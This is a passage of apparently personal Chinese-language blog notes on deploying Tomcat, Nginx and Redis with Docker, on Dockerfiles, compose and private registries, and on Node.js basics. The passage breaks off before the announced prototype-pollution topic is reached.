shell"><span class="hljs-meta">#</span><span class="bash"> 在/root目录下创建tomcat目录用于存储tomcat数据信息</span><br>mkdir ~/tomcat<br>cd ~/tomcat<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_tomcat \<br>-p 8080:8080 \<br>-v $PWD:/usr/local/tomcat/webapps \<br>tomcat<br></code></pre></td></tr></table></figure><ul><li><p>参数说明：</p><ul><li><p><strong>-p 8080:8080：</strong>将容器的 8080 端口映射到主机的 8080 端口</p><p><strong>-v $PWD:/usr/local/tomcat/webapps：</strong>将主机中当前目录挂载到容器的 webapps</p></li></ul></li></ul><ol start="4"><li>使用外部机器访问 tomcat</li></ol><h3 id="Ⅲ、部署-Nginx"><a href="#Ⅲ、部署-Nginx" class="headerlink" title="Ⅲ、部署 Nginx"></a>Ⅲ、部署 Nginx</h3><ol><li>搜索 nginx 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search nginx<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取 nginx 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull nginx<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 在/root目录下创建nginx目录用于存储nginx数据信息</span><br>mkdir ~/nginx<br>cd ~/nginx<br>mkdir conf<br>cd conf<br><span class="hljs-meta">#</span><span class="bash"> 在~/nginx/conf/下创建nginx.conf文件,粘贴下面内容</span><br>vim nginx.conf<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell">user  nginx;<br>worker_processes  1;<br><br>error_log  /var/log/nginx/error.log warn;<br>pid        /var/run/nginx.pid;<br><br><br>events &#123;<br>    worker_connections  1024;<br>&#125;<br><br><br>http &#123;<br>    include       /etc/nginx/mime.types;<br>    default_type  application/octet-stream;<br><br>    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;<br>                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;<br>                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;<br><br>    access_log  /var/log/nginx/access.log  main;<br><br>    sendfile        on;<br>    #tcp_nopush     on;<br><br>    keepalive_timeout  65;<br><br>    #gzip  on;<br><br>    include /etc/nginx/conf.d/*.conf;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_nginx \<br>-p 80:80 \<br>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf \<br>-v $PWD/logs:/var/log/nginx \<br>-v $PWD/html:/usr/share/nginx/html \<br>nginx<br></code></pre></td></tr></table></figure><ul><li>参数说明：<ul><li><strong>-p 80:80</strong>：将容器的 80 端口映射到宿主机的 80 端口。</li><li><strong>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf</strong>：将主机当前目录下的 /conf/nginx.conf 挂载到容器的 :/etc/nginx/nginx.conf。配置目录</li><li><strong>-v $PWD/logs:/var/log/nginx</strong>：将主机当前目录下的 logs 目录挂载到容器的/var/log/nginx。日志目录</li></ul></li></ul><ol start="4"><li>使用外部机器访问 nginx</li></ol><h3 id="Ⅳ、部署-Redis"><a href="#Ⅳ、部署-Redis" class="headerlink" title="Ⅳ、部署 Redis"></a>Ⅳ、部署 Redis</h3><ol><li>搜索 redis 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search redis<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取 redis 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull redis:5.0<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_redis -p 6379:6379 redis:5.0<br></code></pre></td></tr></table></figure><ol start="4"><li>使用外部机器连接 redis</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./redis-cli.exe -h 192.168.149.135 -p 6379<br></code></pre></td></tr></table></figure><h2 id="七、镜像"><a href="#七、镜像" class="headerlink" title="七、镜像"></a>七、镜像</h2><p>为什么一个操作系统的镜像在 Docker 里会很小 因为使用了当前操作系统的 bootfs 拉取下来的只是 rootfs 和往上的镜像层<br>又比如 tomcat 的安装包比镜像小</p><p>linux(bootfs-&gt;rootfs)<br>本质：Docker 的底端是 bootfs 而且是使用的是宿主机的内核 第二层是当前系统的 rootfs 的基础镜像 base image 然后就有软件的编译环境如 jdk 最后暴露在外面的就是软件的镜像 <strong>即分层文件系统</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210408211917032.png"></p><p>对于使用者来说 就是集成了操作系统和编译运行环境的文件系统</p><h2 id="八、压缩文件"><a href="#八、压缩文件" class="headerlink" title="八、压缩文件"></a>八、压缩文件</h2><p>类似于操作系统中 Ghost 把分区克隆为.gho 文件</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210418172617431.png"></p><ol><li>容器转为镜像</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker commit 容器<span class="hljs-built_in">id</span> 镜像名:版本号<br></code></pre></td></tr></table></figure><p>2.压缩镜像</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">docker <span class="hljs-keyword">save</span> -o 压缩文件名 镜像名:版本号<br></code></pre></td></tr></table></figure><p>3.解压出镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker load -<span class="hljs-selector-tag">i</span> 压缩文件名<br></code></pre></td></tr></table></figure><h2 id="九、Dockerfile"><a href="#九、Dockerfile" class="headerlink" title="九、Dockerfile"></a>九、Dockerfile</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210418172524845.png"></p><p>它是一个记录指令的文本文件 每一条指令构造一层基础镜像(开发) 最终构造成一个完整的发布镜像 这种做法和容器打包为压缩文件不一样 但最终效果一致 都能为开发人员提供一个完全一致的开发环境 有利于多方调试 对于测试人员则直接可以把其 docker run 然后用于工作 对于运维人员则可以在应用部署时实现无缝衔接</p><p>据此，我们可以自定义一个软件(操作系统)安装后就有哪些功能(夹带哪些软件) FROM MAITAINER RUN WORKDIR</p><h3 id="编写-Dockerfile"><a href="#编写-Dockerfile" class="headerlink" title="编写 Dockerfile"></a>编写 Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#案例 刚安装的centos终端输入vim发现不能使用 说明vim并没有被载入centos的镜像中 需要用户自行安装 那么我们可以自定义镜像</span><br><br>①定义父镜像 <span class="hljs-keyword">FROM</span> centos7<br>②定义作者信息 <span class="hljs-keyword">MAINTAINER</span> wo02ie<br>③执行安装软件的命令 <span class="hljs-keyword">RUN</span><span class="bash"> apt-get install vim</span><br><span class="hljs-comment">#还可使用离线安装包 ADD springboot.jar app.jar</span><br><span class="hljs-comment">#CMD jar -jar app.jar</span><br><br>④定义默认工作目录 <span class="hljs-keyword">WORKDIR</span><span class="bash">　／ｕｓｒ</span><br>⑤让容器启动执行命令　<span class="hljs-keyword">CMD</span><span class="bash">　（常是）／ｂｉｎ／ｂａｓｈ</span><br></code></pre></td></tr></table></figure><h3 id="使用-Dockerfile-文件"><a href="#使用-Dockerfile-文件" class="headerlink" title="使用 Dockerfile 文件"></a>使用 Dockerfile 文件</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker build -f ..<span class="hljs-regexp">/./</span>Dockerfile -t 镜像名 . <span class="hljs-comment">#这个点不能省略 将来工作寻址用</span><br></code></pre></td></tr></table></figure><p>使用 dockerfile 时 image 里没有 vim 但要换 apt-get 源</p><p>在/etc/apt/</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">echo <span class="hljs-string">&quot;&quot;</span>&gt;sources<span class="hljs-meta">.list</span><br>echo <span class="hljs-string">&quot;deb http://mirrors.163.com/ubuntu/ artful main restricted universe multiverse&quot;</span>&gt;&gt;sources<span class="hljs-meta">.list</span><br>echo <span class="hljs-string">&quot;deb http://mirrors.163.com/ubuntu/ artful-security main restricted universe multiverse&quot;</span>&gt;&gt;sources<span class="hljs-meta">.list</span><br><br><span class="hljs-meta">#这里不放其他的 都是网上找的 比较老的源 失效居多 自己再去找其他的源用吧</span><br></code></pre></td></tr></table></figure><p>除了上面这种方法 还有没有其他更简洁的方法呢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt;要修改的文件 比如sources.list<br>cat &lt;&lt; <span class="hljs-string">EOF &gt; sources.list</span><br><span class="hljs-string">然后就可以输入任何东西 还可以编辑</span><br><span class="hljs-string"></span><br><span class="hljs-string">EOF</span>回车结束<br></code></pre></td></tr></table></figure><h2 id="十、服务编排"><a href="#十、服务编排" class="headerlink" title="十、服务编排"></a>十、服务编排</h2><p>大量服务需要按照一定顺序启动 对服务进行批量管理 就需要使用服务编排</p><p>步骤如下</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>、同样 创建Dockerfile定义好服务环境<br><span class="hljs-number">2</span>、使用docker-compose.yml定义组成的各个服务<br><span class="hljs-number">3</span>、使用命令docker-compose <span class="hljs-keyword">up</span>启动应用<br></code></pre></td></tr></table></figure><ul><li>docker compose 安装</li></ul><p>github 上面的 docker/compose/release 找到对应版本</p><p>使用 curl -L <a href="https://github.com/docker/compose/release/download/xxx/docker-compose-">https://github.com/docker/compose/release/download/xxx/docker-compose-</a> `uname -s`-`uname -m` -o /usr/local/bin/docker-compose</p><p>chmod +X /usr/local/bin/docker-compose</p><p>docker-compose -version</p><ul><li><p>docker compose 使用<br>进入 docekr-compose 文件下 编辑一个 vim docker-compose.yml<br>编辑服务的一些配置服务<br><del>运维操作</del></p></li><li><p>启动一串服务<br>docker-compose up</p></li></ul><h2 id="十一、Docker-私有仓库"><a href="#十一、Docker-私有仓库" class="headerlink" title="十一、Docker 私有仓库"></a>十一、Docker 私有仓库</h2><p>类似于 Github 但这主要用来保存镜像</p><p><strong>搭建步骤：</strong></p><ul><li><p>拉去私有仓库<br>docker pull registry</p></li><li><p>启动私有仓库<br>docekr run -id –name=registry -p 5000:5000 registry</p></li><li><p>访问私有仓库<br>http://本地私有仓库ip:5000/v2/_catalog</p></li></ul><p>访问到一个 json 字符串 说明搭建成功</p><ul><li>编辑加速器文件<br>将私有仓库添加到加速器 vim /etc/docker/daemon.json</li></ul><p>追加：”insecure=registries”:[“本地仓库地址:5000”]</p><ul><li>重启 docker 服务<br>systemctl restart docker</li></ul><p><strong>上传镜像到私有仓库：</strong></p><ul><li><p>添加标记：<br>docker tag 本地镜像名 本地私有仓库 ip:5000/镜像名</p></li><li><p>启动 registry 容器<br>docker start registry</p></li><li><p>上传<br>docker push 本地私有仓库/镜像名</p></li><li><p>从私有仓库拉取镜像<br>docker pull 本地私有仓库 ip:5000/镜像名</p></li></ul><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>docker 容器虚拟化与传统虚拟机比较</p><p>将软件和软件运行环境进行打包 便于开发交付部署</p><p>容器虚拟化的是操作系统/软件 虚拟机虚拟机化的是硬件</p><p>虚拟机可以运行不同的操作系统 容器只能寄生于一个操作系统</p><p><del>虚拟机已死 容器才是未来</del></p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs&amp;原型链污染</title>
    <link href="/2021/04/27/nodejs&amp;Prototype-Pollution-Attack/"/>
    <url>/2021/04/27/nodejs&amp;Prototype-Pollution-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><p><strong>JavaScript</strong>：</p><ul><li><code>ECMAScript</code>(语言基础，如：语法、数据类型结构以及一些内置对象)</li><li><code>DOM</code>（一些操作页面元素的方法）</li><li><code>BOM</code>（一些操作浏览器的方法）</li></ul><p>上面是<code>JavaScript</code>的组成部分，那么<code>Nodejs</code>呢？</p><p><strong>Nodejs</strong>：</p><ul><li><code>ECMAScript</code>(语言基础，如：语法、数据类型结构以及一些内置对象)</li><li><code>os</code>(操作系统)</li><li><code>file</code>(文件系统)</li><li><code>net</code>(网络系统)</li><li><code>database</code>(数据库)</li></ul><p>简单的说 Node.js 就是运行在服务端的 JavaScript。</p><p>Node.js 是一个基于 Chrome JavaScript 运行时建立的一个平台。</p><p>Node.js 是一个事件驱动 I/O 服务端 JavaScript 环境，基于 Google 的 V8 引擎，V8 引擎执行 Javascript 的速度非常快，性能非常好。</p><p>安装、环境配置略</p><h2 id="一、运行脚本"><a href="#一、运行脚本" class="headerlink" title="一、运行脚本"></a>一、运行脚本</h2><p>（ 略）<br>目的：编写简单的一个脚本并运行 了解 nodejs</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;hello world!&quot;</span>) <span class="hljs-meta">#保存为helloworld.js文件</span><br></code></pre></td></tr></table></figure><p>终端到此目录，<code>node helloworld.js</code></p><p>查找命令 node -h</p><h2 id="二、web-服务器"><a href="#二、web-服务器" class="headerlink" title="二、web 服务器"></a>二、web 服务器</h2><p>使用 php 编写后端代码后 部署需要 Apache 或 Nginx 并且要有 mod_php 和 php_cgi 才能成功解析 php</p><p>nodejs 不仅能充当上述服务器的作用 还能实现一个应用</p><p>就上例而言 nodejs 的应用由 http 模块、服务器、处理请求和发送响应</p><h3 id="①-引入模块"><a href="#①-引入模块" class="headerlink" title="① 引入模块"></a>① 引入模块</h3><p>使用 require 载入 http 模块 把实例化的 HTTP 服务赋值给变量 http 其中 require 是 nodejs 自带的 http 模块<br><code>var http = require(&quot;http&quot;);</code></p><h3 id="②-创建服务器"><a href="#②-创建服务器" class="headerlink" title="② 创建服务器"></a>② 创建服务器</h3><p>在 http 模块中提供一函数 creatServer，函数会返回一个对象 可以通过 listen 的方法截获</p><p>http.creatServe()方法创建服务器 listen 8080<br>在里面使用 request 和 response 来接收和响应</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//httpserver.js</span><br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">request,response</span>)</span>&#123;<br>    response.writeHead(<span class="hljs-number">200</span>,&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<span class="hljs-comment">//http头 状态码 内容类型</span><br>    response.end(<span class="hljs-string">&quot;The js had been called!\n&quot;</span>)<br>&#125;).listen(<span class="hljs-number">8080</span>)<span class="hljs-comment">//监听8080端口</span><br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Server running at http://127.0.0.1:8080&#x27;</span>)<br></code></pre></td></tr></table></figure><p>配合 index.html</p><h2 id="三、npm"><a href="#三、npm" class="headerlink" title="三、npm"></a>三、npm</h2><p>npm 是 nodejs 的包管理工具 新版的 nodejs 已经带有 npm<br>但通常要升级<code>npm install npm -g(全局安装)</code><br>也需要配置镜像<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code><br>安装模块分为本地安装和全局安装</p><ul><li><p>本地安装</p><ol><li>将安装包放在 ./node_modules 下（运行 npm 命令时所在的目录），如果没有 node_modules 目录，会在当前执行 npm 命令的目录下生成 node_modules 目录。</li><li>可以通过 require() 来引入本地安装的包。</li></ol></li><li><p>全局安装</p><ol><li>将安装包放在 /usr/local 下或者你 node 的安装目录。</li><li>可以直接在命令行里使用。</li></ol></li></ul><p>卸载<code>npm uninstall npm</code><br>升级<code>npm update npm</code><br>查看安装信息<code>npm list -g</code><br>搜索模块<code>npm search npm</code></p><h3 id="创建模块"><a href="#创建模块" class="headerlink" title="创建模块"></a>创建模块</h3><p>首先来看一个包的 json 位于 node_modules/npm 的 package.json<br>可以看到有</p><pre><code>name - 包名。version - 包的版本号。description - 包的描述。homepage - 包的官网 url 。author - 包的作者姓名。contributors - 包的其他贡献者姓名。dependencies - 依赖包列表。如果依赖包没有安装，npm 会自动将依赖包安装在 node_module 目录下。repository - 包代码存放的地方的类型，可以是 git 或 svn，git 可在 Github 上。main - main 字段指定了程序的主入口文件，require(&#39;moduleName&#39;) 就会加载这个文件。这个字段的默认值是模块根目录下面的 index.js。keywords - 关键字</code></pre><p>npm init(目录下无 package.json 否则会修改当前的 package.json 文件)<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/npminit.png"></p><p>接着使用 npm 来发布模块(不演示)</p><ul><li><input checked="" disabled="" type="checkbox"> 首先在 npm 资源库注册用户<code>npm adduser</code></li><li><input checked="" disabled="" type="checkbox"> 发布<code>npm publish</code></li></ul><h2 id="四、REPL-nodejs-解释器"><a href="#四、REPL-nodejs-解释器" class="headerlink" title="四、REPL nodejs 解释器"></a>四、REPL nodejs 解释器</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/PERl.png"><br>查看 REPL 命令 <code>.help</code></p><p>可以不声明变量 但会直接输出<br>_下划线可以截取上一表达式的运算结果<br>可以键入变量名输出值 也能使用 console.log 函数<br>node 中 ctrl+c 一次退出当前 两次退出解释器 ctrl+d 直接退出解释器</p><h2 id="五、回调函数与事件循环"><a href="#五、回调函数与事件循环" class="headerlink" title="五、回调函数与事件循环"></a>五、回调函数与事件循环</h2><h3 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h3><p>先来看两个例子</p><ul><li>阻塞 1.js</li></ul><p><code>var data = fs.readFileSync(&#39;input.txt&#39;);</code></p><p>读取完文件 执行程序</p><ul><li>非阻塞 2.js</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) return console.error(err);<br>    console.log(data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>读取文件的同时执行后面的代码 因此提高了程序的性能 从而我们可以把需要处理回调函数的参数写在回调函数内</p><p>即 <strong>阻塞是按顺序执行代码的 非阻塞可以不按照顺序执行</strong></p><h3 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h3><p>Node.js 异步编程的直接体现就是回调。</p><p>异步编程依托于回调来实现 但不能说使用了回调后程序就异步化了</p><p>nodejs 是单线程应用程序 而 V8 引擎提供的异步执行回调接口就可以处理大量的并发 从而极大的提升了性能</p><p>nodejs 的几乎每个 API 接口都支持回调函数 所有事件均是上帝视角 当事件被检测到就会触发回调函数<br>Node.js 使用事件驱动模型，webserver 一直接收请求而不等待读写操作（非阻塞式 IO 或事件驱动 IO） 然后去服务下一个 web 请求 当这个请求完成 它被放回处理队列 当到达队列开头 这个结果被返回给用户 这种模型非常高效可扩展性也非常强<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/event_loop.jpg"></p><p>回到开头的引言 我们了解了回调函数以及事件循环 就能执行异步操作了<br>下面是 将执行异步操作的函数写在回调函数的最后一个参数中 回调函数接收错误对象则作为第一个参数</p><p>执行 3.js-&gt;删除 input.txt-&gt;执行 3.js</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> fs = require(<span class="hljs-string">&quot;fs&quot;</span>);<br><br>fs.readFile(&#x27;<span class="hljs-keyword">input</span>.txt&#x27;, function (<span class="hljs-keyword">err</span>, data) &#123;<br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">err</span>)&#123;<br>      console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">err</span>.<span class="hljs-keyword">stack</span>);<br>      <span class="hljs-keyword">return</span>;<br>   &#125;<br>   console.<span class="hljs-built_in">log</span>(data.<span class="hljs-keyword">toString</span>());<br>&#125;);<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;程序执行完毕&quot;</span>);<br></code></pre></td></tr></table></figure><p>readFile 函数读取文件，如果在读取文件过程中发生错误，错误 err 对象就会输出错误信息。<br>如果没发生错误，readFile 跳过 err 对象的输出，文件内容就通过回调函数输出，此时就是一次异步操作。</p><h2 id="六、EventEmitter"><a href="#六、EventEmitter" class="headerlink" title="六、EventEmitter"></a>六、EventEmitter</h2><p>events 模块只提供 events.EventEmitter,它是事件触发和事件监听的封装 EventEmitter 对象中有多个属性 on 绑定事件函数 emit 属性触发事件</p><p>event.js EventEmitter 用法</p><p>event1.js 体现如下</p><p>EventEmitter 的每个事件由一个事件名和若干个参数组成，事件名是一个字符串，通常表达一定的语义。对于每个事件，EventEmitter 支持 若干个事件监听器。</p><p>当事件触发时，注册到这个事件的事件监听器被依次调用，事件参数作为回调函数参数传递。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/EventEmitter.png"></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>event 实例.js 了解其他属性方法…</p><h3 id="error"><a href="#error" class="headerlink" title="error"></a>error</h3><p>一个事件发生错误时没有监听器时会报错 一般要对其设置 error 事件的监听器</p><h2 id="七、Buffer"><a href="#七、Buffer" class="headerlink" title="七、Buffer"></a>七、Buffer</h2><p>JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。</p><p>但在处理像 TCP 流或文件流时，必须使用到二进制数据。因此在 Node.js 中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">const buf = Buffer.<span class="hljs-keyword">from</span>(<span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;ascii&#x27;</span>);<br><br><span class="hljs-comment">// 输出 72756e6f6f62</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><br><span class="hljs-comment">// 输出 cnVub29i</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>))<br></code></pre></td></tr></table></figure><p>目前支持的字符编码 ascii、utf8、utf16le、ucs2 - utf16le、base64、latin1、binary - latin1、hex</p><p>写入缓冲区</p><blockquote><p>buf.write(string[, offset[, length]][, encoding])</p></blockquote><p>从缓冲区读取</p><blockquote><p>buf.toString([encoding[, start[, end]]])</p></blockquote><p>将 buffer 转换为 json 对象</p><blockquote><p>buf.toJSON()</p></blockquote><p>合并缓冲区</p><blockquote><p>Buffer.concat(list[, totalLength])</p></blockquote><p>比较缓冲区</p><blockquote><p>buf.compare(otherBuffer);</p></blockquote><p>拷贝缓冲区</p><blockquote><p>buf.copy(targetBuffer[, targetStart[, sourceStart[, sourceEnd]]])</p></blockquote><p>裁剪缓冲区</p><blockquote><p>buf.slice([start[, end]])</p></blockquote><p>计算缓冲区长度</p><blockquote><p>buf.length;</p></blockquote><h2 id="八、模块系统"><a href="#八、模块系统" class="headerlink" title="八、模块系统"></a>八、模块系统</h2><p>前面介绍过了 引入模块使用 require+模块文件<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/require.jpg"><br>require 接收 http、fs 等原生模块以及某路径下的文件模块，还有 mod 非原生模块</p><p>注意：require()不是全局的！</p><h2 id="九、函数"><a href="#九、函数" class="headerlink" title="九、函数"></a>九、函数</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(word) &#123;<br>  console.log(word);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(someFunction, value) &#123;<br>  someFunction(value);<br>&#125;<br><br>execute(say, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure><p>say 是一个函数 execute 函数的第一个参数就是 say 本身(不是它的返回值) 而 say 中有一个参数 所以用本地变量 someFunction 来传递变量</p><ul><li>匿名函数<br>一般我们函数使用是先声明后定义使用<br>即使我们不急着定义函数体 但在对应域前必须声明了 我们才能调用 而这我们可在函数体内——在参数表中使用本地变量 someFunction 在函数体内直接使用 甚至都不用给函数名字</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span><span class="hljs-params">(someFunction, value)</span></span> &#123;<br>  someFunction(value);<br>&#125;<br><br><span class="hljs-built_in">execute</span>(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(word)</span></span>&#123; console.<span class="hljs-built_in">log</span>(word) &#125;, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="十、路由"><a href="#十、路由" class="headerlink" title="十、路由"></a>十、路由</h2><p>url 请求 GET POST 参数在前面搭建简单应用时没有提及 作为后端处理这些请求就要有相应的服务器的功能<br>router 下有个 index.js 文件 里面可以设置数据库 引入其他模块 同样可以写一个服务的 serve.js 引入 http url 等模块 启动后充当服务器<br>然后用到一个 router.js 的文件 写一个路由函数作为参数传给 server.js<br>至此可以访问 url</p><h2 id="十一、全局变量"><a href="#十一、全局变量" class="headerlink" title="十一、全局变量"></a>十一、全局变量</h2><p>列出一丢丢：</p><p>_filename 当前脚本文件名 输出其绝对路径</p><p>_dirname 当前脚本所在路径</p><p>setTimeout(function(),ms) 全局函数 在指定毫秒后执行一次函数</p><p>clearTimeout(t) 清除 setTimeout()</p><figure class="highlight javascript"><table><tr><td 